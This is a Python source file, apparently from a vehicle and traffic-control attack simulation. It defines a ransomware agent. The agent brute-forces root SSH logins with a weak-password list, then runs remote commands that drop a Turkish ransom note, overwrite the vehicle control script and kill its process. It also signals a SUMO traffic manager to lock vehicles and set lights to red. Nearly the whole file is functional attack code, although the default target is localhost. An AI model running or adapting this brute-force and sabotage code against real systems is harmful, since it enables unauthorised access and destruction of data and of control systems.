import socket
import time

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False
    print("⚠️  [RANSOMWARE] paramiko yüklü değil! pip install paramiko")

RANSOM_NOTE = """
╔══════════════════════════════════════════════════════════╗
║          !!!  UYARI: SİSTEM ŞİFRELENDİ  !!!             ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  Tüm araç kontrol dosyaları şifrelenmiştir.              ║
║  Sistemi geri almak için 48 saat içinde                  ║
║  iletişime geçin: darkweb@ransomgroup.onion              ║
║                                                          ║
║  Ödeme yapılmazsa tüm veriler silinecektir.              ║
║                                                          ║
║  ID: VEH-2026-CTRL-4421                                  ║
╚══════════════════════════════════════════════════════════╝
"""

PASSWORD_LIST = [
    "1234", "admin", "password", "root", "123456",
    "toor", "qwerty", "letmein", "welcome", "test"
] # Simülasyon için basit bir parola listesi


class RansomwareAgent:
    def __init__(self):
        self.ssh_host      = "localhost"
        self.ssh_port      = 2222
        self.username      = "root"
        self.found_password = None

    def check_ssh_open(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.ssh_host, self.ssh_port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def brute_force_ssh(self):
        if not PARAMIKO_AVAILABLE:
            print("⚠️  [RANSOMWARE] Simülasyon modu (paramiko yok)...")
            self.found_password = "1234"
            return True

        print(f"🔑 [RANSOMWARE] SSH Brute Force: {self.ssh_host}:{self.ssh_port}")
        print(f"🔑 [RANSOMWARE] {len(PASSWORD_LIST)} şifre denenecek...")

        for password in PASSWORD_LIST:
            try:
                print(f"   [-] Deneniyor: {self.username}:{password}")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    self.ssh_host,
                    port=self.ssh_port,
                    username=self.username,
                    password=password,
                    timeout=3,
                    banner_timeout=5
                )
                self.found_password = password
                client.close()
                print(f"✅ [RANSOMWARE] ŞİFRE BULUNDU: {self.username}:{password}")
                return True
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                print(f"   [!] Bağlantı hatası: {e}")
                time.sleep(0.5)

        print("❌ [RANSOMWARE] Brute force başarısız.")
        return False

    def execute_ransomware_via_ssh(self):
        if not PARAMIKO_AVAILABLE:
            self._simulate_attack()
            return True

        try:
            print(f"\n💀 [RANSOMWARE] SSH bağlanılıyor: {self.username}:{self.found_password}")
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                self.ssh_host,
                port=self.ssh_port,
                username=self.username,
                password=self.found_password,
                timeout=5
            )

            # Adım 1: Fidye notunu bırak 
            print("📄 [RANSOMWARE] Fidye notu bırakılıyor...")
            note_content = RANSOM_NOTE.replace("'", "'\\''")  # bash escape
            stdin, stdout, stderr = client.exec_command(
                f"printf '%s' '{note_content}' > /app/DOSYALARINIZ_SIFRELENDI.txt"
            )
            stdout.channel.recv_exit_status()  # Komutun bitmesini bekle
            print("📄 [RANSOMWARE] Fidye notu bırakıldı: /app/DOSYALARINIZ_SIFRELENDI.txt")

            # Adım 2: control.py'yi şifrele (üzerine yaz)
            print("🔒 [RANSOMWARE] Kritik dosyalar şifreleniyor...")
            stdin, stdout, stderr = client.exec_command(
                "echo 'ENCRYPTED_BY_RANSOMWARE_VEH-2026-CTRL-4421' > /app/control.py"
            )
            stdout.channel.recv_exit_status()
            print("🔒 [RANSOMWARE] control.py şifrelendi.")

            # Adım 3: pkill — EN SON yap (oturumu kapatır)
            print("💀 [RANSOMWARE] Araç kontrol süreci sonlandırılıyor (pkill)...")
            client.exec_command("pkill -f control.py")
            time.sleep(1)
            print("💀 [RANSOMWARE] control.py SONLANDIRILDI.")

            client.close()
            return True

        except Exception as e:
            print(f"❌ [RANSOMWARE] SSH saldırısı başarısız: {e}")
            return False

    def _simulate_attack(self):
        print("💀 [RANSOMWARE] [SİMÜLASYON] SSH bağlantısı: root:1234")
        time.sleep(0.5)
        print("📄 [RANSOMWARE] [SİMÜLASYON] Fidye notu bırakıldı")
        time.sleep(0.5)
        print("🔒 [RANSOMWARE] [SİMÜLASYON] Dosyalar şifrelendi")
        time.sleep(0.5)
        print("💀 [RANSOMWARE] [SİMÜLASYON] pkill control.py")

    def notify_traffic_manager(self):
        """SSH saldırısı bittikten sonra SUMO'ya da bildir — araçlar mor olsun"""
        import socket as _socket
        try:
            sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect(("localhost", 9999))
            sock.sendall(b"RANSOMWARE")
            sock.recv(1024)
            sock.close()
            print("🟣 [RANSOMWARE] SUMO bildirildi — araçlar kilitlendi, ışıklar kırmızıya alındı.")
        except Exception as e:
            print(f"⚠️  [RANSOMWARE] SUMO bildirimi başarısız (traffic_manager çalışıyor mu?): {e}")

    def run(self, blackboard):
        print("\n" + "=" * 60)
        print("💀 [RANSOMWARE AJANI] SALDIRI BAŞLIYOR")
        print("=" * 60)

        # SSH portunu kontrol et — açık değilse başarısız say
        print(f"\n🔍 [RANSOMWARE] SSH port kontrolü: {self.ssh_host}:{self.ssh_port}")
        if not self.check_ssh_open():
            print(f"❌ [RANSOMWARE] Port {self.ssh_port} kapalı!")
            blackboard.update_key("mission_status", "FAIL")
            return

        print(f"✅ [RANSOMWARE] SSH portu açık!")
        blackboard.update_key("vulnerabilities", ["SSH_OPEN_WEAK_PASSWORD"])

        # Brute force ile şifreyi bul
        if not self.brute_force_ssh():
            blackboard.update_key("mission_status", "FAIL")
            return

        # Saldırıyı uygula
        success = self.execute_ransomware_via_ssh()

        if success:
            # SUMO'ya da bildir — araçlar mor olsun, ışıklar kırmızıya dönsün
            self.notify_traffic_manager()

            print("\n" + "=" * 60)
            print("💀 [RANSOMWARE] SALDIRI TAMAMLANDI!")
            print(RANSOM_NOTE)
            print("=" * 60)
            blackboard.update_key("logs", ["RANSOMWARE_DEPLOYED: vehicle_controller ele gecirildi."])
            blackboard.update_key("mission_status", "SUCCESS")
        else:
            blackboard.update_key("mission_status", "FAIL")